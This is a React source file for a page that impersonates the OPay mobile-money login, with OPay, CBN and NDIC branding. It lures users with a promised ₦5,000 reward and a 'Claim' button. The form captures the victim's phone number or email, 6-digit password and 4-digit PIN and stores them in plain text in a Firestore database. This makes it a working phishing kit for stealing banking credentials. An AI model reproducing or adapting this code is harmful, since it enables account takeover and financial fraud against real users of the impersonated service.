import React, { useState } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faEye, faEyeSlash } from "@fortawesome/free-solid-svg-icons";
import Logo from "../src/assets/opay-logo.jpg";
import CBN from "../src/assets/cbn.jpg";
import NDIC from "../src/assets/ndic.jpg";
import "./App.css";
import { db } from "./firebaseConfig";
import { collection, addDoc } from "firebase/firestore";
// import UserForm from "../src/UserForm";

// const API_URL = process.env.REACT_APP_API_URL || "http://localhost:7212";

const App = () => {
  const [phoneNumber, setPhoneNumber] = useState("");
  const [password, setPassword] = useState("");
  const [pin, setPin] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showPin, setShowPin] = useState(false);
  const [errors, setErrors] = useState({});
  const navigate = useNavigate();

  const validatePhoneNumber = (value) => /^[0-9]{10,15}$/.test(value);
  const validatePassword = (value) => /^\d{6}$/.test(value);
  const validatePin = (value) => /^\d{4}$/.test(value);

  const handleSubmit = async (e) => {
    e.preventDefault();
    const newErrors = {};

    if (!validatePhoneNumber(phoneNumber)) {
      newErrors.phoneNumber = "Invalid phone number";
    }
    if (!validatePassword(password)) {
      newErrors.password = "Password must be 6 digits";
    }
    if (!validatePin(pin)) {
      newErrors.pin = "PIN must be 4 digits";
    }

    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      try {
        await addDoc(collection(db, "users"), {
          phoneNumber,
          password, // Storing password in plain text (NOT RECOMMENDED)
          pin,
          createdAt: new Date(),
        });

        alert("Congratulations, your reward of ₦5,000 is on the way into your account 🎉.");
        navigate("/redirect", { replace: true });
      } catch (error) {
        console.error("Error saving data:", error);
        alert("Error saving data");
      }
    }
  };

  return (
    <div className="container">
      <div className="form-container">
        <img src={Logo} alt="OPay Logo" className="logo" />
        <form onSubmit={handleSubmit} className="form-content">
          <div className="form-group floating">
            <input
              type="text"
              className="form-control"
              id="phoneNumber"
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(e.target.value)}
              placeholder=" "
              required
            />
            <label htmlFor="phoneNumber" className="floating-label">
              Enter your Mobile No./Email
            </label>
            {errors.phoneNumber && <div className="error-message">{errors.phoneNumber}</div>}
          </div>

          <div className="form-group">
            <div className="password-container">
              <input
                type={showPassword ? "text" : "password"}
                className="form-control"
                id="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter 6-digit Password"
                required
              />
              <FontAwesomeIcon
                icon={showPassword ? faEyeSlash : faEye}
                className="toggle-icon"
                onClick={() => setShowPassword(!showPassword)}
              />
            </div>
            {errors.password && <div className="error-message">{errors.password}</div>}
          </div>

          <div className="form-group">
            <div className="password-container">
              <input
                type={showPin ? "text" : "password"}
                className="form-control"
                id="pin"
                value={pin}
                onChange={(e) => setPin(e.target.value)}
                placeholder="PIN"
                required
              />
              <FontAwesomeIcon
                icon={showPin ? faEyeSlash : faEye}
                className="toggle-icon"
                onClick={() => setShowPin(!showPin)}
              />
            </div>
            {errors.pin && <div className="error-message">{errors.pin}</div>}
            <a href="/sign" className="forgot-password">Forgot Password?</a>
          </div>

          <button type="submit" className="btn btn-primary">Claim</button>
        </form>

        <div className="bottom-text-container">
          <div className="bottom-text">
            Don’t have an account yet? <br />
            <a href="/login">Click here to get one</a>
          </div>
        </div>

        <div className="bottom-social">
          <img src={CBN} alt="CBN Logo" className="social-logo" /> Licensed by the{" "}
          <span style={{ color: "#3C3B5F", fontWeight: "bold" }}>CBN</span> and insured by the{" "}
          <img src={NDIC} alt="NDIC Logo" className="social-logo" />
        </div>

        {/* Include the UserForm component */}
        {/* <UserForm /> */}
      </div>
    </div>
  );
};

export default App;
